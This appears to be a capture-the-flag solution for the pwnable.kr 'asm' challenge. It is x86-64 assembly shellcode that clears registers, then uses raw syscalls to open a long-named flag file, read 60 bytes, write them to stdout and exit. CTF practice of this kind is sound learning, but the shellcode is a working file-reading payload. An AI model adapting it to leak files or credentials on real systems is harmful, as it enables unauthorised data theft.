section .text
bits 64
org 0x41414000
global main

main:
    db 0x48,0x31,0xc0,0x48,0x31,0xdb,0x48,0x31,0xc9,0x48,0x31,0xd2,0x48,0x31,0xf6,0x48,0x31,0xff,0x48,0x31,0xed,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x4d,0x31,0xd2,0x4d,0x31,0xdb,0x4d,0x31,0xe4,0x4d,0x31,0xed,0x4d,0x31,0xf6,0x4d,0x31,0xff,0x90

    mov edi, $file
    mov [edi + 231], bl
    mov sil, 2
    mov al, 2
    syscall

    xor rdi, rdi
    mov dil, al
    sub rsp, 60
    mov rsi, rsp
    mov dl, 60
    xor al, al
    syscall

    xor rdi, rdi
    mov dil, 1
    mov al, 1
    syscall

    xor rdi, rdi
    mov al, 60
    syscall

file:
    db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"